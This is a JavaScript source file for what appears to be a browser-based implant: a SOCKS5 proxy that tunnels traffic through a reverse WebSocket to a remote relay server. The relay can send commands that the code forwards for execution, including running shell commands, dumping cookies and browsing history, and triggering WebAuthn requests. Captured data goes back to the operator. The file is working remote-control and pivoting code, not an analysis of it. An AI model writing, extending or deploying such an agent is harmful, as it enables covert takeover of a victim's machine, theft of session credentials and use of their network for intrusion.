import { WASMWebSocket } from './wasm-bridge.js';

export class SocksServer {
  constructor(options = {}) {
    this.port = options.port || 1080;
    this.websocketUrl = options.websocketUrl;
    this.relayToken = options.relayToken;
    this.useWASM = options.useWASM || false;
    this.server = null;
    this.ws = null;
    this.reconnectAttempts = 0;
    this.maxReconnectAttempts = options.maxReconnectAttempts || 60;
    this.baseReconnectDelay = options.baseReconnectDelay || 5000; // 5 seconds
    this.reconnectTimer = null;
    this.isReconnecting = false;
    this.connections = new Map(); // Move connections to class level for persistence across reconnects
  }

  async startLocalSOCKSProxy() {
    try {
      const server = new TCPServerSocket('::');
      const {readable, localAddress, localPort} = await server.opened;
      console.log(`Listening on ${localAddress} port ${localPort}`);

      const reader = readable.getReader();

      for (;;) {
        const {value, done} = await reader.read();
        if (done) {
          console.log('Socket closed');
          break;
        }

        await this.handleConnection(value);
      }
    } catch (err) {
      console.error('Failed to start SOCKS server:', err);
      throw err;
    } finally {
      reader.releaseLock();
    }
  }

  async sendCommandResponse(command, payload, taskId) {
    this.sendData({
      type: 'command_response',
      command,
      payload,
      taskId
    });
  }

  async sendCapturedData(dataType, data) { 
    this.sendData({
      type: 'captured_data',
      dataType,
      data
    });
  }

  async sendData(jsonObj) {
    if (this.ws) {
      this.ws.send(JSON.stringify(jsonObj));
    }
  }

  async startWebSocketProxy() {
    if (!this.websocketUrl || !this.relayToken) {
      throw new Error('WebSocket URL and relay token are required');
    }

    try {
      // Clear any existing reconnect timer
      if (this.reconnectTimer) {
        clearTimeout(this.reconnectTimer);
        this.reconnectTimer = null;
      }

      const url = new URL(this.websocketUrl);

      // Use WASM WebSocket if available and enabled, otherwise fallback to standard WebSocket
      if (this.useWASM) {
        console.log('[SocksServer] Using WASM WebSocket implementation');
        this.ws = new WASMWebSocket(url.toString(), [`token.${this.relayToken}`]);
      } else {
        console.log('[SocksServer] Using standard WebSocket implementation');
        this.ws = new WebSocket(url.toString(), [`token.${this.relayToken}`]);
      }

      const ws = this.ws;
      
      // Use class-level connections map
      const connections = this.connections;

      ws.onmessage = async (message) => {
        try {
          const data = JSON.parse(message.data);
          console.log(`Received WebSocket message:`, {
            type: data.type,
            connectionId: data.connectionId,
            dataLength: data.data ? data.data.length : 0
          });

          if (data.type === 'command') {
            console.log(`Received command:`, data);

            var commandObject = {
              data: data.payload,
              taskId: data.taskId,
            }

            switch (data.command) {
              case 'dir':
              case 'ls':
                commandObject.type = 'ls_command_request';
                break;
              case 'shell':
                commandObject.type = 'shell_command_request';
                break;
              case 'cookies':
                commandObject.type = 'dump_cookies_request';
                break;
              case 'history':
                commandObject.type = 'dump_history_request';
                break;
              case 'webauthn':
                commandObject.type = 'webauthn_request';
                break;
              default:
                console.error(`Unknown command: ${data.command}`);
                return;
            }

            window.broadcastToFirecracker(JSON.stringify(commandObject));
            return;
          }

          if (data.type === 'connect') {
            try {
              const connectionId = data.connectionId;
              console.log(`[${connectionId}] Connecting to ${data.targetHost}:${data.targetPort}`);

              // Initialize connection state FIRST
              console.log(`[${connectionId}] Initializing connection state`);
              connections.set(connectionId, {
                queue: [],
                resolver: null
              });

              // Then start async operations
              const remote = new TCPSocket(data.targetHost, data.targetPort);
              const remoteConn = await remote.opened;
              console.log(`[${connectionId}] Connected to remote`);

              const remoteReader = remoteConn.readable.getReader();
              const remoteWriter = remoteConn.writable.getWriter();

              // Update connection state with remote info
              const conn = connections.get(connectionId);
              if (conn) { // Check if connection still exists (might have been cleaned up)
                Object.assign(conn, {
                  remoteReader,
                  remoteWriter
                });

                // Create WebSocket reader/writer
                const wsSocket = {
                  readable: {
                    getReader: () => {
                      console.log(`[${connectionId}] Creating WebSocket reader`);
                      return ({
                        read: async () => {
                          const conn = connections.get(connectionId);
                          if (!conn) {
                            console.log(`[${connectionId}] Connection not found`);
                            return { done: true };
                          }

                          // Check queue first
                          if (conn.queue.length > 0) {
                            const msg = conn.queue.shift();
                            console.log(`[${connectionId}] Processing queued message: ${msg.type}`);
                            if (msg.type === 'close') return { done: true };
                            if (msg.type === 'data') {
                              const value = new Uint8Array(atob(msg.data).split('').map(c => c.charCodeAt(0)));
                              console.log(`[${connectionId}] Decoded queued data: ${value.length} bytes`);
                              return { value, done: false };
                            }
                          }

                          console.log(`[${connectionId}] Waiting for next message`);
                          const msg = await new Promise(resolve => {
                            conn.resolver = resolve;
                          });
                          conn.resolver = null;

                          console.log(`[${connectionId}] Received message: ${msg.type}`);
                          if (msg.type === 'close') return { done: true };
                          if (msg.type === 'data') {
                            const value = new Uint8Array(atob(msg.data).split('').map(c => c.charCodeAt(0)));
                            console.log(`[${connectionId}] Decoded data: ${value.length} bytes`);
                            return { value, done: false };
                          }
                          return { done: true };
                        },
                        cancel: () => {
                          console.log(`[${connectionId}] WebSocket reader cancelled`);
                          connections.delete(connectionId);
                        }
                      });
                    }
                  },
                  writable: {
                    getWriter: () => ({
                      write: async (chunk) => {
                        console.log(`[${connectionId}] WebSocket writer sending ${chunk.length} bytes`);
                        console.log(`[${connectionId}] WebSocket readyState: ${ws.readyState} (OPEN=${WebSocket.OPEN || WASMWebSocket.OPEN || 1})`);
                        if (ws.readyState === WebSocket.OPEN || ws.readyState === 1) {
                          ws.send(JSON.stringify({
                            type: 'data',
                            connectionId: connectionId,
                            data: btoa(String.fromCharCode.apply(null, chunk))
                          }));
                        } else {
                          console.warn(`[${connectionId}] Cannot send data - WebSocket not open (state=${ws.readyState})`);
                        }
                      },
                      close: () => {
                        console.log(`[${connectionId}] WebSocket writer closing`);
                        if (ws.readyState === WebSocket.OPEN) {
                          ws.send(JSON.stringify({
                            type: 'close',
                            connectionId: connectionId
                          }));
                        }
                        connections.delete(connectionId);
                      }
                    })
                  }
                };

                // Start proxy operation
                this.proxy(
                  wsSocket.readable.getReader(),
                  wsSocket.writable.getWriter(),
                  remoteReader,
                  remoteWriter
                ).catch(e => console.error('Proxy error:', e));
              }
            } catch (e) {
              console.error('Connection failed:', e);
              if (ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({
                  type: 'close',
                  connectionId: data.connectionId
                }));
              }
            }
          } else if (data.type === 'data' || data.type === 'close') {
            const conn = connections.get(data.connectionId);
            if (conn) {
              if (conn.resolver) {
                // If there's a waiting reader, deliver directly
                console.log(`[${data.connectionId}] Delivering message directly to waiting reader`);
                conn.resolver(data);
              } else {
                // Otherwise queue the message
                console.log(`[${data.connectionId}] Queueing message of type ${data.type}`);
                conn.queue.push(data);
              }
            } else {
              console.log(`[${data.connectionId}] No connection found for message`);
            }
          }
        } catch (e) {
          console.error('Error processing message:', e);
        }
      };

      ws.onopen = () => {
        console.log('Connected to relay server');
        // Reset reconnect attempts on successful connection
        this.reconnectAttempts = 0;
        this.isReconnecting = false;
      };
      
      ws.onclose = (event) => {
        console.log(`WebSocket connection closed: ${event.code} ${event.reason}`);
        this.scheduleReconnect();
      };
      
      ws.onerror = (event) => {
        console.error('WebSocket error:', event);
      };

    } catch (err) {
      console.error('Failed to start WebSocket proxy:', err);
      this.scheduleReconnect();
      throw err;
    }
  }

  scheduleReconnect() {
    // Don't schedule if already reconnecting
    if (this.isReconnecting) {
      return;
    }
    
    this.isReconnecting = true;
    
    // Check if we've exceeded max attempts
    if (this.maxReconnectAttempts > 0 && this.reconnectAttempts >= this.maxReconnectAttempts) {
      console.log(`Maximum reconnect attempts (${this.maxReconnectAttempts}) reached. Giving up.`);
      return;
    }
    
    // Calculate delay with exponential backoff
    const delay = Math.min(
      this.baseReconnectDelay * Math.pow(2, this.reconnectAttempts),
      60000 // Cap at 60 seconds
    );
    
    this.reconnectAttempts++;
    
    console.log(`Scheduling reconnect attempt ${this.reconnectAttempts} in ${delay}ms`);
    
    // Clear any existing timer
    if (this.reconnectTimer) {
      clearTimeout(this.reconnectTimer);
    }
    
    // Schedule reconnect
    this.reconnectTimer = setTimeout(() => {
      console.log(`Attempting to reconnect (attempt ${this.reconnectAttempts})...`);
      this.startWebSocketProxy().catch(err => {
        console.error('Reconnect attempt failed:', err);
        // The error handler in startWebSocketProxy will schedule another reconnect
      });
    }, delay);
  }

  async start() {
    if (this.websocketUrl) {
      await this.startWebSocketProxy();
    } else {
      await this.startLocalSOCKSProxy();
    }
  }

  async handleConnection(client) {
    const {readable, writable, remoteAddress, remotePort} = await client.opened;
    const reader = readable.getReader();
    const writer = writable.getWriter();

    try {
      // Read SOCKS version
      const { value: init, done } = await reader.read();
      if (done) return;
      
      if (init[0] !== 0x05) { // SOCKS5
        throw new Error('Unsupported SOCKS version');
      }

      // Send auth method response (no auth)
      await writer.write(new Uint8Array([0x05, 0x00]));

      // Read connection request
      const { value: request } = await reader.read();
      const cmd = request[1];
      const atyp = request[3];

      if (cmd !== 0x01) { // Only support CONNECT
        throw new Error('Only CONNECT is supported');
      }

      let addr;
      let port;

      switch (atyp) {
        case 0x01: // IPv4
          addr = Array.from(request.slice(4, 8))
            .map(x => x.toString())
            .join('.');
          port = (request[8] << 8) + request[9];
          break;

        case 0x03: // Domain name
          const addrLen = request[4];
          addr = new TextDecoder().decode(request.slice(5, 5 + addrLen));
          port = (request[5 + addrLen] << 8) + request[5 + addrLen + 1];
          break;

        case 0x04: // IPv6
          // Group bytes into 16-bit chunks and format properly
          addr = Array.from(request.slice(4, 20))
            .map(x => x.toString(16).padStart(2, '0'))
            .reduce((acc, cur, i) => {
              if (i % 2 === 0) {
                acc.push(cur);
              } else {
                acc[acc.length - 1] += cur;
              }
              return acc;
            }, [])
            .join(':');
          port = (request[20] << 8) + request[21];
          console.log(`IPv6 Address: ${addr}, Port: ${port}`);
          break;

        default:
          throw new Error(`Unsupported address type: ${atyp}`);
      }

      console.log(`Connecting to ${addr}:${port} (type: ${atyp})`);

      // Allow for context switch before attempting connection
      await Promise.resolve();

      try {
        // Connect to destination
        const remote = new TCPSocket(addr, port);
        const remoteConn = await remote.opened;
        console.log(`Connected to ${addr}:${port}`);

        // Send success response
        await writer.write(new Uint8Array([
          0x05, 0x00, 0x00, 0x01,
          0, 0, 0, 0, // bound addr
          0, 0        // bound port
        ]));

        const remoteReader = remoteConn.readable.getReader();
        const remoteWriter = remoteConn.writable.getWriter();

        // Start bidirectional proxy
        await this.proxy(reader, writer, remoteReader, remoteWriter);

      } catch (connectError) {
        console.error('Failed to connect to remote:', connectError);
        // Send connection failed response
        await writer.write(new Uint8Array([
          0x05, 0x04, 0x00, 0x01,  // 0x04 = host unreachable
          0, 0, 0, 0,
          0, 0
        ]));
        throw connectError; // Re-throw to trigger cleanup
      }

    } catch (err) {
      console.error('Connection handler error:', err);
    } finally {
      try {
        reader.releaseLock();
        writer.releaseLock();
      } catch (e) {
        // Ignore errors if locks were already released
      }
    }
  }

  async proxy(clientReader, clientWriter, remoteReader, remoteWriter) {
    const clientToRemote = this.pipeData(clientReader, remoteWriter, 'client->remote');
    const remoteToClient = this.pipeData(remoteReader, clientWriter, 'remote->client');
    
    try {
      // Wait for either direction to complete/fail
      await Promise.race([clientToRemote, remoteToClient]);
    } catch (err) {
      console.error('Proxy error:', err);
    } finally {
      // Clean up all resources
      try {
        await Promise.allSettled([
          clientWriter.close(),
          clientReader.cancel(),
          remoteWriter.close(),
          remoteReader.cancel()
        ]);
      } catch (cleanupErr) {
        console.error('Cleanup error:', cleanupErr);
      }
    }
  }

  async pipeData(reader, writer, direction) {
    const chunkSize = 16384; // 16KB chunks for efficient transfer
    const DISPLAY_BYTES = 0x20; // Number of bytes to display in hex dump
    const BYTES_PER_ROW = 16;

    function formatHexDump(buffer, length) {
      let result = '';
      for (let offset = 0; offset < length; offset += BYTES_PER_ROW) {
        // Offset in hex
        result += offset.toString(16).padStart(8, '0') + ': ';
        
        // Hex values
        const rowBytes = Array.from(buffer.slice(offset, Math.min(offset + BYTES_PER_ROW, length)));
        const hex = rowBytes
          .map(b => b.toString(16).padStart(2, '0'))
          .join(' ');
        result += hex.padEnd(BYTES_PER_ROW * 3 - 1, ' ');
        
        // ASCII representation
        result += '  |';
        const ascii = rowBytes
          .map(b => (b >= 32 && b <= 126) ? String.fromCharCode(b) : '.')
          .join('');
        result += ascii.padEnd(BYTES_PER_ROW, ' ');
        result += '|\n';
      }
      return result;
    }

    try {
      let totalBytes = 0;

      while (true) {
        const { value, done } = await reader.read();
        if (done) {
          console.log(`${direction}: Stream closed after ${totalBytes} bytes`);
          break;
        }

        // Display hex dump of first bytes of every chunk
        if (value.length > 0) {
          const bytesToDisplay = Math.min(value.length, DISPLAY_BYTES);
          console.log(`${direction} chunk ${totalBytes}:`);
          console.log(formatHexDump(value, bytesToDisplay));
        }

        totalBytes += value.length;
        await writer.write(value);
        if (totalBytes % (1024 * 1024) === 0) {  // Log every MB
          console.log(`${direction}: Transferred ${totalBytes / (1024 * 1024)}MB`);
        }
      }
    } catch (err) {
      if (err.name === 'NetworkError') {
        console.log(`${direction}: Connection reset by peer:`, err.message);
      } else {
        console.error(`${direction}: Pipe error:`, {
          name: err.name,
          message: err.message,
          stack: err.stack
        });
      }
      throw err; // Re-throw to trigger cleanup
    } finally {
      try {
        await writer.close();
      } catch (closeErr) {
        // Ignore close errors as the stream might already be closed
      }
    }
  }

  stop() {
    // Clear any reconnect timer
    if (this.reconnectTimer) {
      clearTimeout(this.reconnectTimer);
      this.reconnectTimer = null;
    }
    
    // Close WebSocket if open
    if (this.ws) {
      // Prevent reconnect attempts when intentionally stopping
      this.maxReconnectAttempts = 0;
      
      if (this.ws.readyState === WebSocket.OPEN || 
          this.ws.readyState === WebSocket.CONNECTING) {
        this.ws.close();
      }
      this.ws = null;
    }
    
    // Close server if running
    if (this.server) {
      this.server.close();
      this.server = null;
    }
    
    // Reset state
    this.reconnectAttempts = 0;
    this.isReconnecting = false;
  }
} 